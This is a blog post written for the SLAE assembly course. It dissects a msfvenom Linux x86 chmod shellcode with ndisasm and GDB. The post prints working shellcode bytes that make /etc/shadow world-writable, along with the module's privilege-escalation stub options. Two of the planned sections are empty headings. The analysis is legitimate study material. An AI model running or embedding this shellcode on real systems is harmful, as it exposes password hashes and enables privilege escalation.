---
title: SLAE Exercise 5
tags: SLAE
key: 20190617
comments: true
---

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:
<http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html>

Student ID: SLAE - 1470

All code can be found in: <https://github.com/xMilkPowderx/SLAE-Code>

### Assignment Five:

1. Take up at least 3 shellcode samples created using Msfpayload for linux/x86
2. Use GDB/Ndisasm/Libemu to dissect the funcSonality of the shellcode
3. Present your analysis

In this assignment, I am going to analyst 3 shellcode generated by msfvenom. Since we already covered the classic bind shell and reverse shell in previous assignment, I am not going to repeat those findings. Instead, I choose the following 3 shellcode.

1. linux/x86/chmod
2. linux/x86/meterpreter/reverse_tcp
3. linux/x86/shell_bind_tcp_random_port

### linux/x86/chmod:

Options:
```
       Name: Linux Chmod
     Module: payload/linux/x86/chmod
   Platform: Linux
       Arch: x86
Needs Admin: No
 Total size: 36
       Rank: Normal

Provided by:
    kris katterjohn <katterjohn@gmail.com>

Basic options:
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
FILE  /etc/shadow      yes       Filename to chmod
MODE  0666             yes       File mode (octal)

Description:
  Runs chmod on specified file with specified mode


    Name                Current Setting  Required  Description
    ----                ---------------  --------  -----------
    AppendExit          false            no        Append a stub that executes the exit(0) system call
    PrependChrootBreak  false            no        Prepend a stub that will break out of a chroot (includes setreuid to root)
    PrependFork         false            no        Prepend a stub that executes: if (fork()) { exit(0); }
    PrependSetgid       false            no        Prepend a stub that executes the setgid(0) system call
    PrependSetregid     false            no        Prepend a stub that executes the setregid(0, 0) system call
    PrependSetresgid    false            no        Prepend a stub that executes the setresgid(0, 0, 0) system call
    PrependSetresuid    false            no        Prepend a stub that executes the setresuid(0, 0, 0) system call
    PrependSetreuid     false            no        Prepend a stub that executes the setreuid(0, 0) system call
    PrependSetuid       false            no        Prepend a stub that executes the setuid(0) system call
    VERBOSE             false            no        Enable detailed status messages
    WORKSPACE                            no        Specify the workspace for this module
    Name  Current Setting  Required  Description
    ----  ---------------  --------  -----------
```

Using msfvenom, we get the following shellcode:

```c
unsigned char buf[] = 
"\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74\x63\x2f"
"\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd"
"\x80\x6a\x01\x58\xcd\x80";
```

With the help of ndisasm, we can understand what systemcall does the shellcode use.

<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/SLAE/Ex5-1.JPG"/>

Two systemcalls are used in this shellcode. According to /usr/include/i386-linux-gnu/asm/unistd_32.h, 
```c
0xf = #define __NR_chmod 15
0x1 = #define __NR_exit 1
```

So now we know which systemcalls the shellcode use, the rest will be figuring out how the arguments are passed to the call.

The shellcode will first use cdq <https://www.aldeid.com/wiki/X86-assembly/Instructions/cdq> to set both eax and edx to 0x0. Then, it will assign eax to 0xf, push edx to stack and make a call to 0x16.
This call is actually very interesting because it skip all instruction in between. After examine the value of ebx, we find out that it stores an address value which and be translate back to /etc/shadow.

<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/SLAE/Ex5-2.JPG"/>

So, where does the /etc/shadow come from? there are no sign of the assembly trying to push the value to stack, instead, it just appears after pop ebx.
Remember what we have learnt from the jmp-call-pop technique?
After a call, the next instruction's address will be pushed to the stack. Indeed, ndisasm actually interpret our /etc/shadow to opcode. If we look closer, we will find out the opcode in between is actually hex form of /etc/shadow and ebx is actually referencing the address of the start of /etc/shadow

<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/SLAE/Ex5-4.JPG"/>
<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/SLAE/Ex5-5.JPG"/>
<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/SLAE/Ex5-6.JPG"/>

How about the permission? In Linux, we knew that permission is assigned to a few value, read = 4, write = 2, execute = 1. The default of this chmod shellcode is going to set the permission to world wide read and writable so we are looking for 0666. After throwing the value that is going to assign to ecx, we got

<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/SLAE/Ex5-3.JPG"/>

The octet value of 1B6 is 666, look promising. 

Now, we have all the values and after calling the systemcall, the premission if /etc/shadow was changed

<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/SLAE/Ex5-7.JPG"/>

The rest will be calling the exit systemcall, which is very simple. 

### linux/x86/shell_bind_tcp_random_port:

### linux/x86/meterpreter/reverse_tcp:

